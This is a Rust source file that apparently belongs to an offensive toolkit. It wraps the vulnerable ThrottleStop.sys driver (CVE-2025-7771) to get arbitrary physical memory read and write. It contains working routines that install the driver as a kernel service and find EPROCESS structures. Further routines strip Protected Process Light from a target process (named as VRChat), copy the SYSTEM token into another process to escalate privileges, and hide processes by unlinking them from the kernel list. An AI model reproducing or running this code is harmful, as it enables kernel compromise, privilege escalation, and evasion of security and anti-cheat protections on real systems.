//! ThrottleStop.sys Driver Backend for toolkit
//!
//! Static reverse engineering of CVE-2025-7771 (TechPowerUp ThrottleStop.sys v3.0.0.0)
//! Provides arbitrary physical memory R/W with NO range checks.
//!
//! IOCTL interface derived from disassembly of the IRP_MJ_DEVICE_CONTROL handler.
//! Device: \\.\ThrottleStop  |  SDDL: D:P(A;;GA;;;SY)(A;;GA;;;BA)
//! Requires: Administrator privileges to open device handle.

use std::io;
use std::mem;
use std::ptr;

// --- Windows FFI ---

#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;

    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;
    pub type LPVOID = *mut c_void;

    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR,
            dwDesiredAccess: DWORD,
            dwShareMode: DWORD,
            lpSecurityAttributes: LPVOID,
            dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD,
            hTemplateFile: HANDLE,
        ) -> HANDLE;

        pub fn DeviceIoControl(
            hDevice: HANDLE,
            dwIoControlCode: DWORD,
            lpInBuffer: LPVOID,
            nInBufferSize: DWORD,
            lpOutBuffer: LPVOID,
            nOutBufferSize: DWORD,
            lpBytesReturned: *mut DWORD,
            lpOverlapped: LPVOID,
        ) -> BOOL;

        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetLastError() -> DWORD;
    }
}

#[cfg(windows)]
use ffi::*;

// --- IOCTL Codes (from static RE of ThrottleStop.sys v3.0.0.0) ---

/// I/O port read (IN byte/word/dword)
const IOCTL_IO_PORT_READ: u32 = 0x80006430;
/// I/O port write (OUT byte/word/dword)
const IOCTL_IO_PORT_WRITE: u32 = 0x80006434;
/// MSR read (RDMSR) - no index validation
const IOCTL_MSR_READ: u32 = 0x80006448;
/// MSR write (WRMSR) - blocks IA32_EFER and SYSENTER range only
const IOCTL_MSR_WRITE: u32 = 0x8000644C;
/// Map physical memory to user-mode address space (persistent, max 256 mappings)
const IOCTL_PHYS_MAP_USER: u32 = 0x8000645C;
/// Unmap previously mapped physical memory
const IOCTL_PHYS_UNMAP: u32 = 0x80006460;
/// Get number of active physical memory mappings
const IOCTL_GET_MAP_COUNT: u32 = 0x80006494;
/// Read 1/2/4/8 bytes from physical address (MmMapIoSpace, NO range check)
const IOCTL_PHYS_READ: u32 = 0x80006498;
/// Write 1/2/4/8 bytes to physical address (MmMapIoSpace, NO range check)
const IOCTL_PHYS_WRITE: u32 = 0x8000649C;
/// PCI config space read (HalGetBusDataByOffset)
const IOCTL_PCI_READ: u32 = 0x800064A0;
/// PCI config space write (HalSetBusDataByOffset)
const IOCTL_PCI_WRITE: u32 = 0x800064A4;

// --- Device Path ---

const DEVICE_PATH: &str = r"\\.\ThrottleStop";

// --- Driver Handle ---

#[cfg(windows)]
pub struct ThrottleStopDriver {
    handle: HANDLE,
}

#[cfg(windows)]
impl ThrottleStopDriver {
    /// Open handle to ThrottleStop.sys device.
    /// Requires Administrator privileges.
    /// Service must be registered and started:
    ///   sc create ThrottleStop binPath= <path> type= kernel
    ///   sc start ThrottleStop
    pub fn open() -> io::Result<Self> {
        let wide_path: Vec<u16> = DEVICE_PATH.encode_utf16().chain(std::iter::once(0)).collect();

        let handle = unsafe {
            CreateFileW(
                wide_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };

        if handle == INVALID_HANDLE_VALUE {
            let err = unsafe { GetLastError() };
            return Err(io::Error::from_raw_os_error(err as i32));
        }

        Ok(Self { handle })
    }

    // ===================================================================
    // Physical Memory Read/Write (Primary exploitation primitives)
    // ===================================================================

    /// Read 8 bytes from a physical address.
    /// Uses IOCTL 0x80006498 which calls MmMapIoSpace with NO range validation.
    ///
    /// The driver:
    ///   1. Takes 8-byte physical address as input
    ///   2. MmMapIoSpace(addr, 8, MmNonCached)
    ///   3. Reads 8 bytes from mapped kernel VA
    ///   4. MmUnmapIoSpace
    ///   5. Returns data in output buffer
    pub fn read_physical_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let mut output: u64 = 0;
        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_READ,
                &phys_addr as *const u64 as LPVOID,
                mem::size_of::<u64>() as DWORD,
                &mut output as *mut u64 as LPVOID,
                mem::size_of::<u64>() as DWORD,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(output)
    }

    /// Write 8 bytes to a physical address.
    /// Uses IOCTL 0x8000649C which calls MmMapIoSpace with NO range validation.
    ///
    /// The driver:
    ///   1. Takes [phys_addr:8 | data:N] as input
    ///   2. MmMapIoSpace(addr, N, MmNonCached)
    ///   3. Writes N bytes to mapped kernel VA
    ///   4. MmUnmapIoSpace
    pub fn write_physical_u64(&self, phys_addr: u64, value: u64) -> io::Result<()> {
        let mut input_buf = [0u8; 16];
        input_buf[0..8].copy_from_slice(&phys_addr.to_le_bytes());
        input_buf[8..16].copy_from_slice(&value.to_le_bytes());

        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_WRITE,
                input_buf.as_ptr() as LPVOID,
                input_buf.len() as DWORD,
                ptr::null_mut(),
                0,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(())
    }

    /// Read arbitrary number of bytes from physical memory.
    /// Reads in 8-byte chunks.
    pub fn read_physical_bytes(&self, phys_addr: u64, len: usize) -> io::Result<Vec<u8>> {
        let mut result = Vec::with_capacity(len);
        let mut offset = 0u64;

        while (offset as usize) < len {
            let chunk = self.read_physical_u64(phys_addr + offset)?;
            let remaining = len - offset as usize;
            let to_copy = remaining.min(8);
            result.extend_from_slice(&chunk.to_le_bytes()[..to_copy]);
            offset += 8;
        }

        Ok(result)
    }

    /// Write arbitrary bytes to physical memory.
    /// Writes in 8-byte chunks (pads last chunk with 0x00).
    pub fn write_physical_bytes(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        for (i, chunk) in data.chunks(8).enumerate() {
            let addr = phys_addr + (i * 8) as u64;
            let mut padded = [0u8; 8];
            padded[..chunk.len()].copy_from_slice(chunk);
            let value = u64::from_le_bytes(padded);
            self.write_physical_u64(addr, value)?;
        }
        Ok(())
    }

    // ===================================================================
    // Physical Memory Map to User-Mode (Persistent mapping)
    // ===================================================================

    /// Map a physical memory range into user-mode address space.
    /// Returns a pointer that remains valid until explicitly unmapped.
    /// Uses IOCTL 0x8000645C: MmMapIoSpace + IoAllocateMdl +
    /// MmBuildMdlForNonPagedPool + MmMapLockedPagesSpecifyCache(UserMode).
    /// Max 256 simultaneous mappings per device instance.
    pub fn map_physical_to_user(&self, phys_addr: u64, size: u32) -> io::Result<u64> {
        // Input: [PhysicalAddress:8][Size:4] = 12 bytes
        let mut input_buf = [0u8; 12];
        input_buf[0..8].copy_from_slice(&phys_addr.to_le_bytes());
        input_buf[8..12].copy_from_slice(&size.to_le_bytes());

        let mut output: u64 = 0;
        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MAP_USER,
                input_buf.as_ptr() as LPVOID,
                12,
                &mut output as *mut u64 as LPVOID,
                8,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(output)
    }

    /// Unmap a previously mapped physical memory region.
    /// Uses IOCTL 0x80006460.
    pub fn unmap_physical(&self, phys_addr: u64) -> io::Result<()> {
        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_UNMAP,
                ptr::null_mut(),
                0,
                &phys_addr as *const u64 as LPVOID,
                8,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(())
    }

    // ===================================================================
    // MSR Read/Write
    // ===================================================================

    /// Read a Model-Specific Register.
    /// Uses IOCTL 0x80006448 (RDMSR). No index validation.
    pub fn read_msr(&self, msr_index: u32) -> io::Result<u64> {
        let input: u64 = msr_index as u64;
        let mut output: u64 = 0;
        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_MSR_READ,
                &input as *const u64 as LPVOID,
                8,
                &mut output as *mut u64 as LPVOID,
                8,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(output)
    }

    /// Write a Model-Specific Register.
    /// Uses IOCTL 0x8000644C (WRMSR).
    /// BLOCKED MSRs: 0xC0000080-82 (IA32_EFER), 0x174-176 (SYSENTER).
    pub fn write_msr(&self, msr_index: u32, value: u64) -> io::Result<()> {
        // Input: [MSR_index:4][Value:8] = 12 bytes via OutputBuffer
        let mut buf = [0u8; 12];
        buf[0..4].copy_from_slice(&msr_index.to_le_bytes());
        buf[4..12].copy_from_slice(&value.to_le_bytes());

        let mut bytes_returned: DWORD = 0;

        let result = unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_MSR_WRITE,
                ptr::null_mut(),
                0,
                buf.as_mut_ptr() as LPVOID,
                12,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            return Err(io::Error::last_os_error());
        }

        Ok(())
    }

    // ===================================================================
    // EPROCESS Operations (for toolkit VRChat PPL bypass)
    // ===================================================================

    /// EPROCESS field offsets for Windows 11 25H2 (Build 26200)
    pub const EPROCESS_UNIQUE_PROCESS_ID: u64 = 0x440;
    pub const EPROCESS_ACTIVE_PROCESS_LINKS: u64 = 0x448;
    pub const EPROCESS_DIRECTORY_TABLE_BASE: u64 = 0x028;
    pub const EPROCESS_TOKEN: u64 = 0x4B8;
    pub const EPROCESS_PROTECTION: u64 = 0x87A;
    pub const EPROCESS_IMAGE_FILE_NAME: u64 = 0x5A8;

    /// Walk the EPROCESS linked list to find a process by PID.
    /// Requires: physical address of System EPROCESS (from PsInitialSystemProcess).
    /// Uses Superfetch or page table walk for VA-to-PA translation externally.
    pub fn find_eprocess_by_pid(
        &self,
        system_eprocess_pa: u64,
        target_pid: u32,
        vtop: &dyn Fn(u64) -> u64,
    ) -> io::Result<u64> {
        // Read System EPROCESS pointer (it's a VA stored at PsInitialSystemProcess)
        let system_eprocess_va = self.read_physical_u64(system_eprocess_pa)?;
        let mut current_va = system_eprocess_va;

        loop {
            // Read PID
            let pid_pa = vtop(current_va + Self::EPROCESS_UNIQUE_PROCESS_ID);
            let pid = self.read_physical_u64(pid_pa)? as u32;

            if pid == target_pid {
                return Ok(current_va);
            }

            // Follow ActiveProcessLinks.Flink
            let links_pa = vtop(current_va + Self::EPROCESS_ACTIVE_PROCESS_LINKS);
            let next_flink = self.read_physical_u64(links_pa)?;

            // Next EPROCESS = Flink - offset_of(ActiveProcessLinks)
            let next_va = next_flink - Self::EPROCESS_ACTIVE_PROCESS_LINKS;

            if next_va == system_eprocess_va {
                return Err(io::Error::new(
                    io::ErrorKind::NotFound,
                    format!("EPROCESS not found for PID {}", target_pid),
                ));
            }

            current_va = next_va;
        }
    }

    /// Remove PPL (Protected Process Light) from a process.
    /// Writes 0x00 to EPROCESS.Protection byte.
    /// This is the key primitive for accessing VRChat memory on Public builds.
    pub fn remove_ppl(&self, eprocess_va: u64, vtop: &dyn Fn(u64) -> u64) -> io::Result<()> {
        let protection_pa = vtop(eprocess_va + Self::EPROCESS_PROTECTION);
        // Write single zero byte (PPL disabled)
        self.write_physical_u64(protection_pa, 0x00)?;
        Ok(())
    }

    /// Set PPL level on a process (e.g., 0x61 for WinTcb-Light).
    pub fn set_ppl(&self, eprocess_va: u64, level: u8, vtop: &dyn Fn(u64) -> u64) -> io::Result<()> {
        let protection_pa = vtop(eprocess_va + Self::EPROCESS_PROTECTION);
        self.write_physical_u64(protection_pa, level as u64)?;
        Ok(())
    }

    /// Steal SYSTEM token and apply to target process (privilege escalation).
    pub fn steal_system_token(
        &self,
        system_eprocess_va: u64,
        target_eprocess_va: u64,
        vtop: &dyn Fn(u64) -> u64,
    ) -> io::Result<()> {
        let system_token_pa = vtop(system_eprocess_va + Self::EPROCESS_TOKEN);
        let system_token = self.read_physical_u64(system_token_pa)?;

        let target_token_pa = vtop(target_eprocess_va + Self::EPROCESS_TOKEN);
        self.write_physical_u64(target_token_pa, system_token)?;

        Ok(())
    }

    /// Hide a process via DKOM (unlink from ActiveProcessLinks).
    pub fn hide_process(&self, target_va: u64, vtop: &dyn Fn(u64) -> u64) -> io::Result<()> {
        let links_va = target_va + Self::EPROCESS_ACTIVE_PROCESS_LINKS;
        let links_pa = vtop(links_va);

        // Read current Flink and Blink
        let flink = self.read_physical_u64(links_pa)?;
        let blink = self.read_physical_u64(links_pa + 8)?;

        // prev->Flink = our Flink
        let prev_flink_pa = vtop(blink);
        self.write_physical_u64(prev_flink_pa, flink)?;

        // next->Blink = our Blink
        let next_blink_pa = vtop(flink + 8);
        self.write_physical_u64(next_blink_pa, blink)?;

        // Point to self (safe unlinked state)
        self.write_physical_u64(links_pa, links_va)?;
        self.write_physical_u64(links_pa + 8, links_va)?;

        Ok(())
    }
}

#[cfg(windows)]
impl Drop for ThrottleStopDriver {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.handle);
        }
    }
}

// ===================================================================
// Service Management Helpers
// ===================================================================

/// Install and start the ThrottleStop.sys driver service.
/// Equivalent to:
///   sc create ThrottleStop binPath= <path> type= kernel
///   sc start ThrottleStop
#[cfg(windows)]
pub fn install_service(driver_path: &str) -> io::Result<()> {
    use std::process::Command;

    let output = Command::new("sc")
        .args(["create", "ThrottleStop", &format!("binPath={}", driver_path), "type=", "kernel"])
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // Ignore "already exists" error
        if !stderr.contains("1073") {
            return Err(io::Error::new(io::ErrorKind::Other, stderr.to_string()));
        }
    }

    let output = Command::new("sc")
        .args(["start", "ThrottleStop"])
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // Ignore "already running" error
        if !stderr.contains("1056") {
            return Err(io::Error::new(io::ErrorKind::Other, stderr.to_string()));
        }
    }

    Ok(())
}

/// Stop and remove the ThrottleStop.sys driver service.
#[cfg(windows)]
pub fn remove_service() -> io::Result<()> {
    use std::process::Command;

    let _ = Command::new("sc").args(["stop", "ThrottleStop"]).output();
    let _ = Command::new("sc").args(["delete", "ThrottleStop"]).output();

    Ok(())
}

// ===================================================================
// Integration with toolkit driver_chain.rs
// ===================================================================

/// Trait matching the toolkit PhysicalMemoryDriver interface.
/// Drop-in replacement for SIVX64/ASMMAP64 backends.
pub trait PhysicalMemoryDriver {
    fn read_phys(&self, addr: u64, size: usize) -> io::Result<Vec<u8>>;
    fn write_phys(&self, addr: u64, data: &[u8]) -> io::Result<()>;
    fn driver_name(&self) -> &'static str;
}

#[cfg(windows)]
impl PhysicalMemoryDriver for ThrottleStopDriver {
    fn read_phys(&self, addr: u64, size: usize) -> io::Result<Vec<u8>> {
        self.read_physical_bytes(addr, size)
    }

    fn write_phys(&self, addr: u64, data: &[u8]) -> io::Result<()> {
        self.write_physical_bytes(addr, data)
    }

    fn driver_name(&self) -> &'static str {
        "ThrottleStop.sys (CVE-2025-7771)"
    }
}
